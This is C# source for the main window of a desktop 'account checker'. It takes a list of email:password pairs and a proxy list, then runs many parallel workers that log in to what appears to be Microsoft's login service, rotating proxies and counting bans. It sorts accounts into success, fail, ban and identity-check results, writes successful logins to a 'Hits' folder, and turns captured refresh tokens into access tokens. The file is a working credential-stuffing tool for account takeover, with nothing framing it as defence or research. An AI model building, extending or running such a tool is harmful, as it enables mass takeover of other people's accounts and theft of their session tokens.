using System.Collections.Concurrent;
using System.IO;
using System.Net.Http;
using Microsoft.Win32;
using System.Windows;
using AccountCheckerWPF.Enums;
using AccountCheckerWPF.Helper;
using AccountCheckerWPF.Managers;
using AccountCheckerWPF.Models;
using AccountCheckerWPF.Services.Interface;
using Newtonsoft.Json.Linq;

namespace AccountCheckerWPF
{
    public partial class MainWindow : Window
    {
        private readonly BlockingCollection<string> _accCh = new();
        private SemaphoreSlim _semaphore = new SemaphoreSlim(1, 1);
        private ConcurrentBag<Proxy> _proxies = new ConcurrentBag<Proxy>();
        private int _globalindex = 0;
        private int _retry = 0;
        private int _fail = 0;
        private int _success = 0;
        private int _ban = 0;
        private int _identity = 0;
        private int _unknown = 0;
        private readonly ProxyManager _proxyManager;
        private readonly AccountManager _accountManager;

        private readonly IHttpServices _httpServices;

        public MainWindow(ProxyManager proxyManager, AccountManager accountManager, IHttpServices httpServices)
        {
            _proxyManager = proxyManager;
            _accountManager = accountManager;
            _httpServices = httpServices;
            InitializeComponent();
            LoadProxyTypes();
        }

        private void LoadProxyTypes()
        {
            ProxyTypeComboBox.ItemsSource = Enum.GetValues(typeof(ProxyTypeEnums));
        }

        private void SelectAccountFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == true)
            {
                var accountFileName = openFileDialog.FileName;
                SelectAccountFileTxt.Text = accountFileName;
            }
        }

        private void SelectProxyFileBtn_Click(object sender, RoutedEventArgs e)
        {
            var openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == true)
            {
                var proxyFileName = openFileDialog.FileName;
                SelectProxyFileTxt.Text = proxyFileName;
            }
        }

        private void NumberOfBots_PreviewTextInput(object sender, System.Windows.Input.TextCompositionEventArgs e)
        {
            if (!int.TryParse(e.Text, out _))
            {
                e.Handled = true;
            }
        }

        private async void CheckAccountBtn_Click(object sender, RoutedEventArgs e)
        {
            if (string.IsNullOrWhiteSpace(SelectProxyFileTxt.Text))
            {
                MessageBox.Show("Please select a proxy file first.");
                return;
            }

            if (string.IsNullOrWhiteSpace(SelectAccountFileTxt.Text))
            {
                MessageBox.Show("Please select an account file first.");
                return;
            }

            if (ProxyTypeComboBox.SelectedItem == null)
            {
                MessageBox.Show("No Proxy Type selected.");
                return;
            }

            var selectedProxyType = (ProxyTypeEnums)ProxyTypeComboBox.SelectedItem;
            try
            {
                var proxyCount = _proxyManager.LoadProxiesFromFile(SelectProxyFileTxt.Text, selectedProxyType);
                Console.WriteLine($"Loaded {proxyCount} proxies");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Please ensure proxy file exists!");
                return;
            }

            try
            {
                var accountCount = _accountManager.LoadFromFile(SelectAccountFileTxt.Text);
                Console.WriteLine($"Loaded {accountCount} accounts");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Please ensure account file exists!");
                return;
            }

            _httpServices.InitHttpClient();

            var hitsDirectory = "./Hits";
            if (!Directory.Exists(hitsDirectory))
            {
                Directory.CreateDirectory(hitsDirectory);
                Console.WriteLine("Hits directory created.");
            }
            else
            {
                Console.WriteLine("Hits directory loaded.");
            }

            var hitFilePath = Path.Combine(hitsDirectory, DateTime.Now.ToString("yyyy-MM-dd_HH-mm-ss") + ".txt");

            await using var hitFileWriter = new StreamWriter(hitFilePath, false);
            var botCount = int.Parse(NumberOfBots.Text);
            _semaphore = new SemaphoreSlim(botCount, botCount);

            var tasks = new List<Task>();
            for (var i = 0; i < botCount; i++)
            {
                tasks.Add(Task.Run(WorkerFunc));
            }

            foreach (var account in _accountManager.Accounts)
            {
                _accCh.Add(account);
            }

            _accCh.CompleteAdding();

            await Task.WhenAll(tasks);

            Console.WriteLine("Done checking!");
        }

        private async Task WorkerFunc()
        {
            try
            {
                await _semaphore.WaitAsync();
                await Task.Run(async () =>
                {
                    while (_accCh.TryTake(out var account))
                    {
                        if (string.IsNullOrEmpty(account) || !account.Contains(":"))
                        {
                            continue;
                        }

                        await ProcessAccountAsync(account);
                    }
                });
            }
            finally
            {
                _semaphore.Release();
            }
        }

        private async Task ProcessAccountAsync(string account)
        {
            var (email, password) = CommonHelper.ParseAccountStr(account);

            while (true)
            {
                try
                {
                    var responseGetParamsFromLoginPage = await _httpServices.SendGetParamsFromLoginPageRequestAsync();
                    var paramsFromLoginPage =
                        CommonHelper.GetParamsFromLoginPage(await responseGetParamsFromLoginPage.Content
                            .ReadAsStringAsync());

                    var responsePostLogin = await _httpServices.SendPostLoginRequestAsync(email, password,
                        paramsFromLoginPage.PPFT,
                        paramsFromLoginPage.ContextId, paramsFromLoginPage.BK, paramsFromLoginPage.UAID);

                    var responseBodyPostLogin = await responsePostLogin.Content.ReadAsStringAsync();

                    var retryStatus =
                        await HandlePostLoginResponse(responsePostLogin, responseBodyPostLogin, email, password);
                    if (retryStatus != RetryStatus.Retry)
                        break;
                }
                catch
                {
                    _retry++;
                }
            }
        }

        private async Task<RetryStatus> HandlePostLoginResponse(HttpResponseMessage postResponse, string bodyPost,
            string email, string password)
        {
            var cookies = CommonHelper.GetCookies(postResponse);
            var responseStatus = CommonHelper.EvaluatePostLoginResponse(bodyPost, cookies, postResponse);

            switch (responseStatus)
            {
                case LoginKeyCheckStatus.Fail:
                    _fail++;
                    return RetryStatus.Done;

                case LoginKeyCheckStatus.Ban:
                    _ban++;
                    return RetryStatus.Done;

                case LoginKeyCheckStatus.Retry:
                    _retry++;
                    return RetryStatus.Retry;

                case LoginKeyCheckStatus.Success:
                    _success++;
                    await HandleSuccessResponse(postResponse, cookies);
                    return RetryStatus.Done;

                case LoginKeyCheckStatus.Identity:
                    _identity++;
                    await CommonHelper.WriteToIdentityFile(email, password);
                    return RetryStatus.Done;

                case LoginKeyCheckStatus.Unknown:
                    _unknown++;
                    _retry++;
                    return RetryStatus.Retry;

                default:
                    return RetryStatus.Done;
            }
        }

        private async Task HandleSuccessResponse(HttpResponseMessage postResponse, List<string> cookies)
        {
            var cid = CommonHelper.GetCookieValue("MSPCID", cookies)?.ToUpper();

            var address = postResponse.RequestMessage.RequestUri.ToString();
            var refreshToken = CommonHelper.ExtractValueBetween(address, "refresh_token=", "&");

            if (refreshToken != null)
            {
                var getAccessTokenResponse = await _httpServices.SendPostRequestToGetAccessTokenAsync(refreshToken);
                var getAccessTokenResponseBody = await getAccessTokenResponse.Content.ReadAsStringAsync();
                var json = JObject.Parse(getAccessTokenResponseBody);
                var accessToken = json["access_token"];
            }
        }
    }
}